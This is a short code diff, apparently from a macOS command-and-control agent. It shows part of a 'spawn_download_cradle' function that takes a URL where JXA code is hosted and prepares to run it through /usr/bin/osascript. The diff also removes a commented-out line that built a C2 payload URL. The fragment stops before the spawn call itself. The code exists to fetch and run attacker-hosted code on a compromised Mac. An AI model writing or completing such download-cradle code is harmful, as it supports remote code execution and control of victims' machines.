@@ -1,7 +1,6 @@
 exports.spawn_download_cradle = function(task, command, params){
     try{
         let config = JSON.parse(params);
-        //full_url = C2.baseurl + "api/v1.0/payloads/get/" + split_params[3];
         if(!config.hasOwnProperty('url')){return {"user_output": "missing url parameter: 'a URL address where the jxa code is hosted'", "completed": true, "status": "error"};}
         let full_url = config['url'];
         let path = "/usr/bin/osascript";
